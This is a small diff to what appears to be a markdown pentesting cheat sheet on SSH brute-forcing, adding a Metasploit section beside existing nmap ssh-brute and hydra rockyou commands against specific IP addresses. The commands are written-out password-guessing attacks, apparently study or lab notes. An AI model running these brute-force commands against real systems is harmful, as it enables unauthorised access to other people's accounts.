@@ -16,3 +16,8 @@ nmap 192.168.143.67 -p 22 --script ssh-brute --script-args userdb=username.txt,p
 hydra -l student -P /usr/share/wordlists/rockyou.txt ssh://192.194.185.3 -f
 
 ```
+
+#### SSH Bruteforce With Metasploit
+```
+scanner/ssh/ssh_login module
+```
